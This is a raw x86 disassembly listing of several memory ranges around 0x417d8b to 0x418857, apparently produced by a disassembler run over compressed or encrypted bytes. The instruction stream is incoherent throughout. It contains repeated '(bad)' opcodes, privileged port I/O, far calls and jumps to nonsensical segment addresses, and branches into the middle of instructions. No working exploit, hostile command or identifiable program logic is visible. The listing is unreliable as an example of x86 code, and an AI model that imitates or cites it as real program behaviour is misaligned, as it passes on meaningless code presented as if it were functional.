  417d8b:	dec    eax
  417d8c:	shl    BYTE PTR [ecx],1
  417d8e:	jbe    0x417d55
  417d90:	and    cl,cl
  417d92:	or     DWORD PTR [ebx-0x61],esi
  417d95:	mov    esi,0x1525e102
  417d9a:	fisubr DWORD PTR ds:0x7cd36b6
  417da0:	in     eax,0xb9
  417da2:	mov    edx,0x9f55efde
  417da7:	and    dl,al
  417da9:	fidiv  WORD PTR cs:[ecx+0x3377d98c]
  417db0:	lods   al,BYTE PTR ds:[esi]
  417db1:	adc    bh,bl
  417db3:	fisubr WORD PTR [esi+0x1836362]
  417db9:	in     eax,dx
  417dba:	add    eax,0x6bc6ef5b
  417dbf:	in     al,dx
  417dc0:	retf   0xa30d
  417dc3:	enter  0x33cb,0xce
  417dc7:	mov    dh,0x85
  417dc9:	xchg   BYTE PTR [esi+0x6b],ch
  417dcc:	dec    edi
  417dcd:	jp     0x417e16
  417dcf:	out    dx,al
  417dd0:	pusha  
  417dd1:	popf   
  417dd2:	cdq    
  417dd3:	je     0x417e35
  417dd5:	(bad)  
  417dd6:	push   cs
  417dd7:	call   0x2e9b:0x25fb1875
  417dde:	sti    
  417ddf:	call   0xab811cf2
  417de4:	xor    ch,ch
  417de6:	gs jns 0x417d8e
  417de9:	mul    dh
  417deb:	imul   esp,DWORD PTR [eax-0x74],0x0
	...
  417e53:	add    BYTE PTR [eax],al
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	mov    eax,esi
  417e64:	jae    0x417e83
  417e66:	add    DWORD PTR [bx+di],eax
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
  417e6d:	add    ah,ah
  417e6f:	stc    
  417e70:	xor    BYTE PTR [edx-0x18],0xbb
  417e74:	call   0x5410:0x261ed7a
  417e7b:	sub    ebp,DWORD PTR [ebx-0x5eee0762]
  417e81:	jge    0x417ee9
  417e83:	rcr    DWORD PTR [edi-0x57],cl
  417e86:	adc    eax,0x5a3cc35
  417e8b:	mov    edx,0x593f71ae
  417e90:	mov    ch,0x75
  417e92:	outs   dx,DWORD PTR ds:[esi]
  417e93:	push   edi
  417e94:	test   BYTE PTR [edx-0x50a85eeb],dh
  417e9a:	pop    ss
  417e9b:	mov    esi,0x9c05c1
  417ea0:	repnz sbb DWORD PTR [edi-0x5840ca47],esi
  417ea7:	push   ss
  417ea8:	add    eax,ebp
  417eaa:	(bad)  
  417eab:	loope  0x417e99
  417ead:	dec    ebx
  417eae:	xchg   BYTE PTR [esi-0x6ccbcc54],cl
  417eb4:	jo     0x417f24
  417eb6:	das    
  417eb7:	js     0x417ec9
  417eb9:	stos   BYTE PTR es:[edi],al
  417eba:	xor    dh,BYTE PTR [ebx+0xe]
  417ebd:	or     ah,BYTE PTR [ebx-0x97311b7]
  417ec3:	mov    esi,0x44ca360d
  417ec8:	retf   0xbb98
  417ecb:	sub    al,0x31
  417ecd:	scas   al,BYTE PTR es:[edi]
  417ece:	jns    0x417f2c
  417ed0:	in     eax,0x23
  417ed2:	jle    0x417ede
  417ed4:	mov    ecx,0xe2513b0b
  417ed9:	inc    ebp
  417eda:	jmp    0x4ce8:0x72e4
  417ee0:	add    al,0x77
  417ee2:	xchg   ecx,eax
  417ee3:	fcomp  QWORD PTR [ecx+ecx*4]
  417ee6:	push   edi
  417ee7:	inc    esp
  417ee8:	jae    0x417f5e
  417eea:	jmp    0x10ae:0xf0dd2221
  417ef1:	xor    bl,BYTE PTR [edi-0x2a]
  417ef4:	sbb    ebp,DWORD PTR [edi-0x2c]
  417ef7:	stos   BYTE PTR es:[edi],al
  417ef8:	sar    DWORD PTR [edi],1
  417efa:	pop    ds
  417efb:	mov    dl,0x9
  417efd:	xchg   ebp,eax
  417efe:	int    0xe2
  417f00:	sahf   
  417f01:	and    bl,al
  417f03:	mov    bh,BYTE PTR [ebp+0x253f5c7b]
  417f09:	test   BYTE PTR [ecx+0x65],0xbb
  417f0d:	cmp    esi,DWORD PTR [edi+0x5a5d1a06]
  417f13:	shl    BYTE PTR [esi],1
  417f15:	sub    eax,DWORD PTR ds:0xa9f182ff
  417f1b:	ret    0xc31e
  417f1e:	push   esi
  417f1f:	or     edx,DWORD PTR [edx+0x457b7456]
  417f25:	outs   dx,BYTE PTR ds:[esi]
  417f26:	mov    edx,0x1f5e25ae
  417f2b:	mov    cl,0xbc
  417f2d:	jmp    0x51234b35
  417f32:	mov    edi,0x624ddd95
  417f37:	popf   
  417f38:	loope  0x417ec5
  417f3a:	push   0xab5b34f3
  417f3f:	arpl   WORD PTR [edi],ax
  417f41:	cld    
  417f42:	or     eax,DWORD PTR [ecx-0x7a45e61b]
  417f48:	out    0xc4,eax
  417f4a:	and    DWORD PTR [ebx],esi
  417f4c:	cmp    ecx,esp
  417f4e:	pop    es
  417f4f:	lods   eax,DWORD PTR ds:[esi]
  417f50:	xchg   ch,bl
  417f52:	inc    ebp
  417f53:	sbb    eax,0x5e5e3184
  417f58:	or     al,0x46
  417f5a:	sbb    al,0xb
  417f5c:	data16 ja 0x417fa5
  417f5f:	mov    ecx,0x2e6b100a
  417f64:	mov    ecx,DWORD PTR [esi]
  417f66:	aam    0x18
  417f68:	dec    eax
  417f69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f6a:	jo     0x417f74
  417f6c:	iret   
  417f6d:	mov    DWORD PTR [eax],eax
	...
  417fd3:	add    BYTE PTR [eax],al
  417fd5:	add    BYTE PTR [edx-0x1a],ah
  417fd8:	out    0x3b,al
  417fda:	out    0x3b,al
  417fdc:	(bad)  
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	fidiv  WORD PTR [ebx+ebx*4]
  417fe5:	loopne 0x41804e
  417fe7:	add    al,BYTE PTR [ecx]
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    DWORD PTR [eax],eax
  417fed:	add    BYTE PTR [ebx+ecx*8],bh
  417ff0:	retf   
  417ff1:	test   eax,0x32d88497
  417ff6:	jecxz  0x417f88
  417ff8:	mov    ebx,0xbde6b585
  417ffd:	and    dh,al
  417fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418000:	in     eax,dx
  418001:	rol    ch,1
  418003:	pop    ebp
  418005:	add    ebp,DWORD PTR [ebx+ecx*2]
  418008:	lods   al,BYTE PTR ds:[esi]
  418009:	sbb    eax,0x6c84d9f9
  41800e:	pop    edi
  41800f:	test   eax,0x3c960e01
  418014:	sbb    dh,bh
  418016:	scas   al,BYTE PTR es:[edi]
  418017:	dec    ecx
  418018:	adc    BYTE PTR [esi+0x37fde2b4],al
  41801e:	push   edi
  41801f:	scas   eax,DWORD PTR es:[edi]
  418020:	or     eax,0x82df96bf
  418025:	popa   
  418026:	shl    DWORD PTR [edi+0x70],0x73
  41802a:	ret    0xfa02
  41802d:	jp     0x4180a5
  41802f:	sar    BYTE PTR [ecx+0x65f37bfb],1
  418035:	jmp    0x9f5fc055
  41803a:	or     DWORD PTR [edi+ebx*4-0x6659d67d],edx
  418041:	in     al,dx
  418042:	popf   
  418043:	ss jg  0x418052
  418046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418047:	xchg   ebx,eax
  418048:	repz sar BYTE PTR [eax],cl
  41804b:	and    bl,al
  41804d:	sub    al,BYTE PTR [esi+0x5d]
  418050:	js     0x41802a
  418052:	or     BYTE PTR [eax],cl
  418054:	sbb    al,al
  418056:	pop    ebx
  418057:	mov    dl,0xf4
  418059:	jo     0x418040
  41805b:	out    dx,al
  41805c:	inc    ebp
  41805d:	nop
  41805e:	xor    BYTE PTR [esi+0x4223874],ch
  418064:	adc    al,0xb1
  418066:	mov    dh,0xc9
  418068:	ins    DWORD PTR es:[edi],dx
  418069:	imul   edx,DWORD PTR [ebx-0x4d],0xa741fe7c
  418070:	pop    eax
  418071:	mov    ds:0xbcd07525,al
  418076:	rcl    DWORD PTR [edx-0x7d6c25e9],1
  41807c:	push   esi
  41807d:	or     BYTE PTR [ebp+0xd],0xb1
  418081:	or     ebp,ebx
  418083:	outs   dx,DWORD PTR ds:[esi]
  418084:	lahf   
  418085:	inc    esi
  418086:	js     0x418050
  418088:	add    DWORD PTR [ecx-0x1f87d8f2],eax
  41808e:	(bad)  
  41808f:	cmp    edx,edx
  418091:	add    esi,ebx
  418093:	call   0xf3d5:0x5b09c368
  41809a:	ds pop ss
  41809c:	inc    edx
  41809d:	aaa    
  41809e:	ror    DWORD PTR [ecx-0x33],0x85
  4180a2:	mov    edi,0xd164f16
  4180a7:	inc    ebp
  4180a8:	lds    esi,FWORD PTR [eax-0x24]
  4180ab:	xor    DWORD PTR [ecx+0x21],esi
  4180ae:	push   edx
  4180af:	stos   DWORD PTR es:[edi],eax
  4180b0:	push   cs
  4180b1:	or     dh,bl
  4180b3:	or     eax,0x2ca8f6c5
  4180b8:	clc    
  4180b9:	pop    ecx
  4180ba:	call   0xccaf91ae
  4180bf:	cmp    BYTE PTR [ebx+0x7e],dl
  4180c2:	xor    dh,BYTE PTR [ebp+0x1e]
  4180c5:	sbb    ebx,DWORD PTR [ecx]
  4180c7:	or     BYTE PTR [esi+ebp*4],ah
  4180ca:	call   0x772d2c9c
  4180cf:	adc    DWORD PTR [edx],0x794baf2f
  4180d5:	ret    0x6ade
  4180d8:	scas   al,BYTE PTR es:[edi]
  4180d9:	ds dec esi
  4180db:	jae    0x4180ea
  4180dd:	fcom   QWORD PTR [eax+ebp*8-0x1b]
  4180e1:	lahf   
  4180e2:	sar    BYTE PTR [eax-0x22],cl
  4180e5:	std    
  4180e6:	je     0x418113
  4180e8:	jle    0x4180fc
  4180ea:	pop    edx
  4180eb:	push   0x42
  4180ed:	in     al,dx
	...
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0xf62fdebc,eax
  418163:	jno    0x418110
  418165:	adc    al,0x67
  418167:	add    eax,DWORD PTR [ecx]
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    BYTE PTR [ebx],bh
  41816f:	stos   BYTE PTR es:[edi],al
  418170:	sub    ebp,eax
  418172:	aam    0x1e
  418174:	sbb    eax,DWORD PTR [edi-0x41]
  418177:	dec    edi
  418178:	push   esi
  418179:	cmp    eax,edx
  41817b:	retf   
  41817c:	xor    DWORD PTR [esi+0x39acfbe3],edx
  418182:	fcomip st,st(2)
  418184:	(bad)  
  418185:	fwait
  418186:	pop    edi
  418187:	js     0x418159
  418189:	pop    edx
  41818a:	fnstsw WORD PTR [eax+eiz*8]
  41818d:	sbb    edi,DWORD PTR [edi-0x5ccacadb]
  418193:	push   esi
  418194:	psubusb mm7,mm1
  418197:	aad    0x79
  418199:	stc    
  41819a:	add    ebx,DWORD PTR [esi+ebp*8]
  41819d:	inc    ebx
  41819e:	loopne 0x4181a9
  4181a0:	push   ss
  4181a1:	xchg   edi,eax
  4181a2:	cwde   
  4181a3:	and    al,0x72
  4181a5:	jno    0x4181ee
  4181a7:	popf   
  4181a8:	push   ds
  4181a9:	sbb    al,0x87
  4181ab:	dec    esi
  4181ac:	jno    0x418177
  4181ae:	mov    ds:0xc1213a76,al
  4181b3:	dec    esp
  4181b4:	mov    ah,0x55
  4181b6:	add    BYTE PTR [ebx+0x435580d9],ch
  4181bc:	neg    eax
  4181be:	cmp    ah,BYTE PTR [esi-0x19]
  4181c1:	gs pop ecx
  4181c3:	pop    es
  4181c4:	add    bl,BYTE PTR [esi+0x6e583f67]
  4181ca:	int3   
  4181cb:	mov    ebp,0x7d4accba
  4181d0:	mov    ah,0x56
  4181d2:	xor    al,0xf8
  4181d4:	sbb    ah,BYTE PTR [esi-0x2a]
  4181d7:	pop    eax
  4181d8:	sti    
  4181d9:	ret    0xab27
  4181dc:	inc    edx
  4181dd:	ins    DWORD PTR es:[edi],dx
  4181de:	mov    bl,0x57
  4181e0:	rcl    DWORD PTR [edx],0x99
  4181e3:	and    ebx,eax
  4181e5:	dec    edx
  4181e6:	imul   esp,eax,0x2f5bf980
  4181ec:	pushf  
  4181ed:	jns    0x41819a
  4181ef:	sbb    ecx,DWORD PTR [esi+0x771c41be]
  4181f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f6:	cs out 0x0,al
  4181f9:	push   0x97542fa1
  4181fe:	stos   DWORD PTR es:[edi],eax
  4181ff:	mov    eax,ds:0x77fa1a02
  418204:	push   0xffffffa0
  418206:	add    BYTE PTR ds:0x30d8e129,0xc4
  41820d:	cmc    
  41820e:	mov    esi,0xa364e948
  418213:	mov    ebx,0xa3ebc351
  418218:	ja     0x4181b8
  41821a:	into   
  41821b:	adc    cl,BYTE PTR [ecx+eax*8-0x33]
  41821f:	mov    bh,BYTE PTR [edi-0x4363efbf]
  418225:	std    
  418226:	mov    ebx,0x387c362b
  41822b:	stos   DWORD PTR es:[edi],eax
  41822c:	jecxz  0x4181c1
  41822e:	je     0x4182a9
  418230:	pop    es
  418231:	xchg   DWORD PTR [ebx+0x41f9f7c4],eax
  418237:	push   0xcff8e5a8
  41823c:	bound  edi,QWORD PTR [edi+0x5ed6a4f6]
  418242:	dec    eax
  418243:	mov    esi,0x17d8506
  418248:	loop   0x418288
  41824a:	fiadd  WORD PTR [esi+0x7d86d701]
  418250:	or     DWORD PTR [edx],edi
  418252:	and    eax,0xb2d1f392
  418257:	sbb    BYTE PTR [eax+ebx*2-0x2610ebba],al
  41825e:	sbb    eax,0x72a3e428
  418263:	dec    ebp
  418264:	test   esp,ebp
  418266:	pop    ds
  418267:	ds xchg ebx,eax
  418269:	and    eax,0xd8bdc24e
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0xe678b8d6
  4182e4:	repz call 0x428751
  4182ea:	add    BYTE PTR [ecx],al
  4182ec:	add    BYTE PTR [eax],al
  4182ee:	gs in  eax,0x5c
  4182f1:	xor    esp,DWORD PTR [esi+esi*8]
  4182f4:	xchg   BYTE PTR [edi+0x3a],cl
  4182f7:	stc    
  4182f8:	adc    al,dh
  4182fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182fb:	jmp    0xac40b128
  418300:	cli    
  418301:	mov    esp,0x361b7967
  418306:	xor    eax,0x60edd9e6
  41830b:	dec    eax
  41830c:	jmp    0x43f014b3
  418311:	leave  
  418312:	js     0x418374
  418314:	stc    
  418315:	pop    esi
  418316:	cmp    edi,DWORD PTR [ebx+0x5f]
  418319:	or     ebx,DWORD PTR [ecx+ecx*2]
  41831c:	sub    DWORD PTR [edx-0x21],ebp
  41831f:	aaa    
  418320:	xchg   ebp,eax
  418321:	adc    eax,0xd2dcf191
  418326:	das    
  418327:	jmp    0x41832b
  418329:	sbb    eax,0xcfe05336
  41832e:	or     BYTE PTR [ebp+0x659208af],0x86
  418335:	(bad)  
  418336:	mov    ?,WORD PTR [eax-0x11b6e873]
  41833c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41833d:	sbb    ebp,DWORD PTR [ebx+0x61]
  418340:	fucomip st,st(0)
  418342:	xchg   ecx,eax
  418343:	pop    ebx
  418344:	cs xchg esp,eax
  418346:	sub    al,dl
  418348:	les    ecx,FWORD PTR es:[edx-0x48c0b5b]
  41834f:	xor    DWORD PTR [edx-0x5f],ebp
  418352:	pop    ebx
  418353:	xlat   BYTE PTR ds:[ebx]
  418354:	aam    0xad
  418356:	pusha  
  418357:	xchg   esp,eax
  418358:	sub    al,0x1f
  41835a:	xor    dh,BYTE PTR [ebp+0xbc2b2b2]
  418360:	loop   0x4183b3
  418362:	aam    0x44
  418364:	out    0x52,al
  418366:	fs mov esp,0x6f6b4f86
  41836c:	push   edi
  41836d:	sti    
  41836e:	mov    dl,0x4f
  418370:	data16 outs dx,BYTE PTR ds:[esi]
  418372:	jbe    0x4183c4
  418374:	push   cs
  418375:	inc    edx
  418376:	or     cl,0xed
  418379:	dec    esi
  41837a:	sbb    bh,BYTE PTR [edi]
  41837c:	cmp    eax,DWORD PTR [eax-0x1]
  41837f:	xor    al,0xe9
  418381:	inc    ebx
  418382:	(bad)  
  418383:	and    eax,0xbedcc73
  418388:	arpl   WORD PTR [edx],cx
  41838a:	fild   WORD PTR [ecx-0x721214fe]
  418390:	ret    
  418391:	adc    dh,dh
  418393:	ror    BYTE PTR [ecx+0x718e3f70],1
  418399:	push   ecx
  41839a:	and    eax,0xdb590a4c
  41839f:	mov    esp,0x6031f449
  4183a4:	mov    ebp,0x672c591
  4183a9:	aam    0x2f
  4183ab:	cld    
  4183ac:	ins    DWORD PTR es:[edi],dx
  4183ad:	(bad)  
  4183af:	test   eax,0x2fdfe494
  4183b4:	cmc    
  4183b5:	inc    edx
  4183b6:	mov    al,ds:0x722c40d1
  4183bb:	mov    DWORD PTR [ecx+0x462b700a],ebp
  4183c1:	mov    ch,0xe0
  4183c3:	and    al,0xc1
  4183c5:	imul   ebp,esi,0xc1ff49ba
  4183cb:	aaa    
  4183cc:	pop    ebp
  4183cd:	jb     0x4183c5
  4183cf:	or     DWORD PTR [eax],esp
  4183d1:	inc    ecx
  4183d2:	call   0xbdedf47d
  4183d7:	out    dx,eax
  4183d8:	out    dx,al
  4183d9:	jp     0x4183b4
  4183db:	sub    bl,BYTE PTR [edx+0x41]
  4183de:	test   BYTE PTR [edi-0x4e],bh
  4183e1:	dec    esp
  4183e2:	inc    edx
  4183e3:	shl    DWORD PTR [ebx-0x7bbb0b0a],cl
  4183e9:	out    0xfa,al
  4183eb:	xchg   edi,eax
  4183ec:	mov    al,0xfd
	...
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	mov    WORD PTR [edx+0x567119e],gs
  418468:	add    DWORD PTR [eax],eax
  41846a:	add    BYTE PTR [ecx],al
  41846c:	add    BYTE PTR [eax],al
  41846e:	stos   DWORD PTR es:[edi],eax
  41846f:	rol    BYTE PTR [ebp+esi*4+0x71],cl
  418473:	xlat   BYTE PTR ds:[ebx]
  418474:	cs nop
  418476:	test   al,0x34
  418478:	addr16 or eax,0x4e957697
  41847e:	xor    DWORD PTR [eax-0x415e76dc],esi
  418484:	and    al,0xa3
  418486:	pop    eax
  418487:	or     DWORD PTR [eax],ebp
  418489:	and    ebx,edx
  41848b:	ins    BYTE PTR es:[edi],dx
  41848c:	jmp    0xd2f0:0x44f48bef
  418493:	iret   
  418494:	jp     0x4184ee
  418496:	ret    0xedbc
  418499:	pusha  
  41849a:	mov    WORD PTR [edi-0x79],ds
  41849d:	lock nop
  41849f:	je     0x418477
  4184a1:	(bad)  
  4184a2:	xchg   esi,eax
  4184a3:	sub    BYTE PTR [ecx-0x57c4c9f3],0x3e
  4184aa:	sbb    BYTE PTR [esi+0x3a76ba82],bh
  4184b0:	fnstsw ax
  4184b2:	xlat   BYTE PTR ds:[ebx]
  4184b3:	sub    esi,edx
  4184b5:	inc    ecx
  4184b6:	mov    dl,0x81
  4184b8:	cmp    al,0xc7
  4184ba:	retf   
  4184bb:	cmp    esp,DWORD PTR [ebx+0x6d1cf989]
  4184c1:	into   
  4184c2:	mov    BYTE PTR [edi-0x61],bh
  4184c5:	adc    dh,BYTE PTR [edx]
  4184c7:	imul   edi,DWORD PTR [esi-0x6e],0x313368bc
  4184ce:	mov    ch,0x8b
  4184d0:	sub    ecx,DWORD PTR [eax]
  4184d2:	enter  0x7e53,0x24
  4184d6:	ja     0x418476
  4184d8:	pop    ds
  4184d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184da:	je     0x418489
  4184dc:	jae    0x418506
  4184de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184df:	and    ecx,esp
  4184e1:	sbb    esi,DWORD PTR [ecx+0x53]
  4184e4:	inc    edx
  4184e5:	or     al,0xeb
  4184e7:	stos   BYTE PTR es:[edi],al
  4184e8:	retf   
  4184e9:	rcl    al,0x3c
  4184ec:	das    
  4184ed:	push   ebx
  4184ee:	test   eax,0xbd576cb0
  4184f3:	xor    al,0x28
  4184f5:	fisub  WORD PTR [esi-0x462925af]
  4184fb:	push   0x6d8f577
  418500:	cmp    dh,al
  418502:	xchg   DWORD PTR fs:[edi],ebp
  418505:	pop    ebp
  418506:	push   0xf2ac33a4
  41850b:	cdq    
  41850c:	test   esp,ebp
  41850e:	(bad)  ds:0x8cef84f0
  418514:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  418516:	and    DWORD PTR [esi-0xe0ef451],edi
  41851c:	mov    eax,0x48f5812a
  418521:	(bad)  
  418522:	and    al,0xd6
  418524:	xor    eax,0x9152d33
  418529:	pop    esp
  41852a:	or     edx,DWORD PTR [eax-0x32]
  41852d:	inc    eax
  41852e:	add    ah,ah
  418530:	arpl   WORD PTR ds:0x77e20fe7,bx
  418536:	fmul   DWORD PTR [esi]
  418538:	sbb    eax,0x9b5d9b2b
  41853d:	push   cs
  41853e:	dec    edi
  41853f:	xor    BYTE PTR [ecx+0x6b07fa05],ch
  418545:	fisub  WORD PTR [ecx-0x48]
  418548:	xor    bl,ah
  41854a:	mov    ch,0xe9
  41854c:	ror    DWORD PTR [ebp-0x3a],1
  41854f:	in     al,dx
  418550:	add    esi,DWORD PTR [ebp-0x1fc2ab87]
  418556:	out    dx,eax
  418557:	sbb    eax,DWORD PTR [esi]
  418559:	mov    BYTE PTR cs:[eax+0x329e823d],ah
  418560:	mov    al,BYTE PTR [eax-0x7e]
  418563:	adc    eax,0xaf45c832
  418568:	pop    ds
  418569:	mov    ch,0x34
  41856b:	sbb    ch,al
  41856d:	xchg   esi,eax
	...
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	push   0x677ffc54
  4185e7:	push   es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	jmp    0xbafe0ab9
  4185f3:	adc    eax,0xffffff80
  4185f6:	ins    DWORD PTR es:[edi],dx
  4185f7:	aam    0x39
  4185f9:	mov    ch,0x82
  4185fb:	aas    
  4185fc:	sahf   
  4185fd:	fld    TBYTE PTR [eax]
  4185ff:	push   esp
  418600:	push   ebx
  418601:	lock pop esi
  418603:	cmc    
  418604:	push   eax
  418605:	sti    
  418606:	sub    bh,dl
  418608:	test   DWORD PTR [edi-0x69],edi
  41860b:	xlat   BYTE PTR ds:[ebx]
  41860c:	xchg   ecx,esi
  41860e:	mov    ds:0xa3eac713,eax
  418613:	ss push edi
  418615:	pop    ebp
  418616:	sti    
  418617:	mov    fs:0x7f00f8f,al
  41861d:	(bad)  
  41861e:	(bad)  
  41861f:	out    dx,eax
  418620:	in     eax,dx
  418621:	sbb    al,0x59
  418623:	ret    
  418624:	and    BYTE PTR [edi],0x2d
  418627:	jg     0x4185cf
  418629:	cs push 0x5cbefd25
  41862f:	and    DWORD PTR [eax],esi
  418631:	and    BYTE PTR [esi-0x3bbe961c],bl
  418637:	or     esi,DWORD PTR [eax+0x1]
  41863a:	jne    0x4186a5
  41863c:	(bad)  
  41863d:	(bad)  
  41863e:	cmp    al,0x59
  418640:	arpl   WORD PTR [ecx+ecx*1],si
  418643:	leave  
  418644:	lea    ebx,[eax+0x3b]
  418647:	xor    BYTE PTR ds:[edi-0x706e8072],bh
  41864e:	adc    ch,BYTE PTR [ebx-0x6e06fa78]
  418654:	dec    esi
  418655:	mov    ebx,0x2816b706
  41865a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41865b:	push   ebx
  41865c:	stos   BYTE PTR es:[edi],al
  41865d:	mov    ds:0xa8d72958,eax
  418662:	cmp    dl,BYTE PTR [edx-0x72ae860d]
  418668:	mov    edx,0x766df5fc
  41866d:	or     al,bl
  41866f:	dec    ebx
  418670:	and    ah,BYTE PTR [esi]
  418672:	or     esi,esp
  418674:	xchg   BYTE PTR [ebx+ebp*2],dh
  418677:	ds test eax,0xacba4cf1
  41867d:	(bad)  
  41867e:	shl    BYTE PTR [ecx],cl
  418680:	pushf  
  418681:	ja     0x4186ed
  418683:	push   eax
  418684:	fnstcw WORD PTR [ebx+eax*1-0x541f3621]
  41868b:	and    eax,0x22b0dd4d
  418690:	outs   dx,BYTE PTR ds:[esi]
  418691:	mov    esi,0xecea5685
  418696:	jle    0x418657
  418698:	mov    ds:0xdcc70851,al
  41869d:	push   ss
  41869e:	ficom  DWORD PTR [edx+0x48ec3b7b]
  4186a4:	into   
  4186a5:	out    dx,al
  4186a6:	or     eax,0xaa8280f4
  4186ab:	inc    ebx
  4186ac:	dec    ebp
  4186ad:	sbb    dh,BYTE PTR [esi]
  4186af:	arpl   di,bp
  4186b1:	push   edi
  4186b2:	cmp    al,0xc1
  4186b4:	mov    ds:0xa3356c64,eax
  4186b9:	mov    bh,0x58
  4186bb:	loopne 0x41872e
  4186bd:	sub    eax,DWORD PTR [edi+0x68]
  4186c0:	inc    edx
  4186c1:	call   0xc2170a6e
  4186c6:	xchg   ecx,eax
  4186c7:	pop    esi
  4186c8:	cld    
  4186c9:	jp     0x4186cc
  4186cb:	or     DWORD PTR [edi],ecx
  4186cd:	mov    ebx,0x6d32f9f1
  4186d2:	sub    BYTE PTR [edx],ch
  4186d4:	push   cs
  4186d5:	push   ebp
  4186d6:	call   0xfbbf:0x21962abc
  4186dd:	mov    DWORD PTR [eax],edi
  4186df:	ss and eax,0x9ce5e479
  4186e5:	pop    ebp
  4186e6:	dec    ebp
  4186e7:	pop    edx
  4186e8:	adc    bh,BYTE PTR [esi+0x807ae01]
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	pop    esi
  418763:	bound  eax,QWORD PTR [esi]
  418765:	cmp    ah,BYTE PTR [edi+0x7]
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	movnti DWORD PTR ds:0xd683c349,esp
  418775:	jp     0x418775
  418777:	sub    al,dh
  418779:	and    ecx,DWORD PTR [eax-0x87d541c]
  41877f:	inc    eax
  418780:	mov    esi,0xa6ff7dd
  418785:	rcr    DWORD PTR [ebx+ebx*2-0x20],1
  418789:	jg     0x4187b8
  41878b:	pop    ds
  41878c:	bound  esi,QWORD PTR [edi+0x39f53ae2]
  418792:	xor    BYTE PTR [edi+0x5e],ch
  418795:	and    esi,edx
  418797:	dec    esi
  418798:	jge    0x418813
  41879a:	inc    ebx
  41879b:	jg     0x418803
  41879d:	mov    BYTE PTR [edx+ebx*1],dl
  4187a0:	add    ah,al
  4187a2:	ds sbb dl,dl
  4187a5:	les    ebx,FWORD PTR [edx+0x63aa6cd4]
  4187ab:	dec    eax
  4187ac:	cmp    BYTE PTR [edx+0x1a],ch
  4187af:	mov    WORD PTR [ebx+edx*8+0xa],ss
  4187b3:	ja     0x418774
  4187b5:	std    
  4187b6:	(bad)  
  4187b8:	mov    bl,0xa4
  4187ba:	and    al,0x72
  4187bc:	pop    edx
  4187bd:	scas   eax,DWORD PTR es:[edi]
  4187be:	shl    BYTE PTR [edx-0x1530ad78],0x1c
  4187c5:	or     DWORD PTR [ebx-0x7f2be75b],ebp
  4187cb:	add    al,0x68
  4187cd:	stc    
  4187ce:	xchg   ecx,eax
  4187cf:	inc    ecx
  4187d0:	push   0xb77c6016
  4187d5:	cs mov ebx,0x6b1e3ce1
  4187db:	shr    DWORD PTR [edi],cl
  4187dd:	push   0xffffff92
  4187df:	jbe    0x4187b8
  4187e1:	mov    esp,0xcf25c65
  4187e6:	or     edi,DWORD PTR ds:0xf05f1d43
  4187ec:	out    dx,eax
  4187ed:	loope  0x418824
  4187ef:	xor    al,0xa
  4187f1:	mov    ah,0x7e
  4187f3:	repnz push esp
  4187f5:	sbb    cl,ah
  4187f7:	jle    0x418788
  4187f9:	cld    
  4187fa:	or     edx,DWORD PTR [ecx-0x7379a849]
  418800:	leave  
  418801:	jp     0x4187af
  418803:	pop    ebp
  418804:	adc    eax,0xb05579ae
  418809:	dec    esi
  41880a:	leave  
  41880b:	scas   eax,DWORD PTR es:[edi]
  41880c:	cdq    
  41880d:	jns    0x418793
  41880f:	jl     0x418844
  418811:	cmp    bh,BYTE PTR [edi]
  418813:	push   ebp
  418814:	add    al,0x78
  418816:	mov    bl,0x82
  418818:	mov    ebx,0xd323bcf
  41881d:	imul   esp,DWORD PTR [ecx-0x78215724],0x771356a4
  418827:	push   bp
  418829:	add    ebp,DWORD PTR [edi+edi*1-0x16]
  41882d:	fcmovu st,st(2)
  41882f:	fidivr WORD PTR [ebx-0x6a072ed8]
  418835:	pop    ds
  418836:	ret    0xc745
  418839:	test   eax,0xcccf97c3
  41883e:	pushf  
  41883f:	sub    al,0xb4
  418841:	loop   0x4187f9
  418843:	fild   QWORD PTR [ebx+eax*4]
  418846:	mov    esi,0xccfb6e0c
  41884b:	sbb    DWORD PTR [edi],eax
  41884d:	or     al,0xea
  41884f:	mov    gs,WORD PTR [ebp-0x78d82f66]
  418855:	or     al,0xa4
  418857:	mul    BYTE PTR [edi]
